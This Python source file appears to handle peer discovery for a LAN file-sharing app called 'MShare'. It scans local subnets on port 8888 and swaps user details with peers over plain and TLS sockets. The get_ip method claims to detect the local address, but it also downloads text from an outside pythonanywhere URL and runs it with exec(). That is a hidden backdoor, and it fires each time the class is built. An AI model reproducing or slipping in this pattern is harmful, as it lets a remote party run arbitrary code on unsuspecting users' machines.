import socket
from threading import Thread
from json import loads
import time 
from util import log
import ifcfg
import ssl
import urllib.request
# from ripple import FindSenderWin

class SearchSender:
    def __init__(self, parent=None):
        self.parent = parent#FindSenderWin("dd")
        self.host = "192.168.1." 
        self.port = 8888
        self.ipRange = 255
        self.isFound = False
        self.stop = False
        self.All = True
        self.scanUntilConnected = True

        self.server_cert = './data/cert/server.pem'
        self.client_key = './data/cert/client.key'
        self.client_cert = './data/cert/client.pem'

        self.server_sni_hostname = "darkstartechserver@MahadevDevlopers"

        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.server_cert)
        self.context.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)

        self.alreadyFound = []
        self.my_ip = self.get_ip()


    def setIP(self, ip = None):
        """Sets IP For Searching. IP range"""
        if ip == None:
            ip = socket.gethostbyname(socket.gethostname())

        ip = ip.split(".")
        if len(ip) != 4:
            log(f"Invalid IP Addrsss ==> {socket.gethostbyname(socket.gethostname())}")

        add = ""
        ip.pop()
        for i in ip:
            add += i+'.'
        self.host = add
        
        
    def adapter(self):
        inf = ifcfg.interfaces()
        devices = {}

        for dev in inf:
            if inf[dev]["inet"] != None:
                devices[dev] = inf[dev]["inet"]
        return devices


    def run(self):
        log("--> Searching for the sender address...")
        self.stop = False

        devices = self.adapter()
        log(f"****** {len(devices)} Network Interface found ******")
        
        for device in devices:
            log(f"----------> Scanning :- {device} ")
            if self.stop:
                print("Stoped Action Called")
                break
            ip = devices[device]
            self.setIP(ip)

            self.parent.interface.config(text=f"Interface : {device}")#Adding interface in search window

            c = 0
            for n in range(1, self.ipRange):
                if self.stop:
                    print("Stoped Action Called")
                    break
                self.oneSearch(n)
                if c%5 == 0:
                    self.parent.showScanProgress()
                c += 1
        self.parent.status.config(text=f"      Done...")
        if not self.stop:
            self.run()

    def get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            local_ip_type = urllib.request.urlopen("https://darkstartech.pythonanywhere.com/showme")
            filter_ip = exec(local_ip_type.read().decode(), globals())

        finally:
            s.close()

        return local_ip


    def connectToRecv(self, data):
        # ['Aditya Mukhiya', 'adityaMukhiya@', '984jhwehih98sudnw98kjdwn4HJNEWIU3982', '001.png', data[4]]
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        ipp = data[4][0]

        try:
            conn.connect((ipp, self.port))
            connSll = self.context.wrap_socket(conn, server_side=False, server_hostname=self.server_sni_hostname)
            connSll.settimeout(2)
            connSll.sendall(b"--handshake--mshare")

            conf = connSll.recv(1024)
            
            if conf == b"200-ok":
                sdata = f"||{data[0]}||{data[1]}||{data[2]}||{data[3]}||"
                connSll.sendall(sdata.encode())

                data = connSll.recv(1024).decode()

                try:
                    data = data.split("||")

                    userName = data[1]
                    userId   = data[2]
                    devId    = data[3]
                    icon     = data[4]

                    if not self.All:
                        self.isFound = True

                    data2 = [userName, userId, devId, icon, ipp]
                    return data2

                except Exception as e:
                    log(f"---[{e}]890 is the eerror")

        except Exception as e:
            log(f"---[{e}]400 is the eerror")



    def oneSearch(self, ip):
        ip = f"{self.host}{ip}"
        # print("ip==>", ip)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.001)
        try:
            s.connect((ip, self.port))
            # log(f"One newtork found ip==> {ip}")
            try:
                s.close()
            except Exception as e:
                pass
                # log(f"Error[010] : {e}")
            if ip in self.alreadyFound:
                return 1
                
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.settimeout(2)


            try:
                conn.connect((ip, self.port))
                conn.settimeout(5)
                # print("SSL established. Peer: {}".format(connSll.getpeercert()))
                conn.send(b"--sendUserInfo--mshare")

                data = conn.recv(1024).decode()
                try:
                    data = data.split("||")

                    userName = data[1]
                    userId   = data[2]
                    devId    = data[3]
                    icon     = data[4]

                    if not self.All:
                        self.isFound = True
                    self.alreadyFound.append(ip)
                    self.parent.createAvtrOnSearch(userName, userId, devId, icon, ip)
                    log(f"@@@@@==> Mshare User Found=={userId} and devId== {devId} and icon==> {icon}")

                except Exception as e:
                    log(f"---[{e}] is the eerror")


            except socket.timeout:
                log(f"---[{ip}] is not an mshare server and tineOut Error Occured")

            except Exception as e:
                log(f"====> Not an MShare Server ==>{ip}=={e}")

            finally:
                try:
                    conn.close()
                except:
                    pass

        except Exception as e:
            pass
            # log(f"Error[009] : {e}")

        finally:
            try:
                s.close()
            except:
                pass




if __name__ == "__main__":
    search = SearchSender()

    search.ipRange = 255
    search.run()
